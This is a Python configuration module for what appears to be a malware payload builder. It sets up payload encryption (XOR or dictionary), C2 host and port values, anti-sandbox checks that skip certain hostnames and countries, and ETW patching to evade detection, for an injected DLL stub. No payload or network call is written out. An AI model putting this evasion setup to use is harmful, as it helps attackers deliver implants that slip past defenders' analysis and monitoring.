from configparser import ConfigParser
import os
import sys

from .utils import generate_high_entropy_int


config = ConfigParser()
config.read(".conf") 

def is_set(value):
    return value != None and value != ""

VERBOSE = False
PRIORIZE_SIZE = False


if len(sys.argv) > 4:
    VERBOSE = sys.argv[1].lower() == "true"
    PRIORIZE_SIZE = sys.argv[2].lower() == "true"
    PAYLOAD_TYPE = sys.argv[3].lower()
else:
    raise ValueError("Not enough arguments provided. Expected: VERBOSE, PRIORIZE_SIZE, PAYLOAD_TYPE, ETW")

# ===============================

ENCRYPTION_METHOD = config.get("Payload", "encryption_method", fallback="").strip()
if ENCRYPTION_METHOD == "xor":
    if config.get("Payload", "encryption_key") == "random":
        ENCRYPTION_KEY = generate_high_entropy_int(0x1111, 0xFFFF)
    else:
        ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)
elif ENCRYPTION_METHOD == "dictionary" or ENCRYPTION_METHOD == "dict":
    ENCRYPTION_KEY = 1
    WORDLIST_SOURCE = config.get("Payload", "wordlist_source", fallback="data/words_100000.txt").strip()
else:
    sys.exit("Error: Invalid encryption method specified in the configuration (.conf) file.\nValid options are 'xor', 'dictionary', or 'dict'.")

# C2 infos
LHOST = config.get("Payload", "lhost") if is_set(config.get("Payload", "lhost")) else None
LPORT = config.getint("Payload", "lport") if is_set(config.get("Payload", "lport")) else None
if len(PAYLOAD_TYPE) == 0:
    PAYLOAD_TYPE = config.get("Payload", "type") if is_set(config.get("Payload", "type")) else None

# =========== ANTI SANDBOX ================

DISK_SIZE = config.get("Anti-Analysis", "disk_size")
RAM_SIZE = config.get("Anti-Analysis", "ram_size")
CPU_COUNT = config.get("Anti-Analysis", "cpu_cores")

TARGET_HOSTNAME = config.get("Anti-Analysis", "target_hostname")

AVOID_HOSTNAME = config.get("Anti-Analysis", "avoid_hostname").split(",")
if len(AVOID_HOSTNAME) <= 1 and AVOID_HOSTNAME[0] == "":
    AVOID_HOSTNAME = []

AVOID_COUNTRIES = config.get("Anti-Analysis", "avoid_countries").split(",")
if len(AVOID_COUNTRIES) <= 1 and AVOID_COUNTRIES[0] == "":
    AVOID_COUNTRIES = []


# ========== EVASION ============

argVal_etw_patching = sys.argv[4].lower() == "true"
confVal_etw_patching = config.get("Evasion", "etw_patching") if is_set(config.get("Evasion", "etw_patching")) else False
ETW_PATCHING = argVal_etw_patching or confVal_etw_patching

# ===============================

WORKING_FOLDER = "build/"
STUB_FILE = "main.c"
PAYLOAD_NAME = "injected-dll.dll"
PAYLOAD_FILE = "payload.txt"